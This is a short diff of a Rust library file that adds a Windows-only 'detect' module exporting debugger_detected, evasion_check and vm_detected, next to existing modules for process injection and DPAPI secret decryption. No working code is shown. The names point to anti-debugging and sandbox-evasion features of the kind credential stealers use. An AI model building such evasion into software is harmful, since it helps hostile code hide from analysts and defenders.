@@ -18,6 +18,8 @@
 #[cfg(windows)]
 pub mod apitable;
 #[cfg(windows)]
+pub mod detect;
+#[cfg(windows)]
 pub mod dpapi;
 #[cfg(windows)]
 pub mod injector;
@@ -31,6 +33,8 @@ pub mod pe;
 pub mod resolve;
 #[cfg(windows)]
 pub mod winpaths;
+#[cfg(windows)]
+pub use detect::{debugger_detected, evasion_check, vm_detected};
 #[cfg(windows)]
 pub use dpapi::{decrypt_dpapi, protect_dpapi};
 #[cfg(windows)]
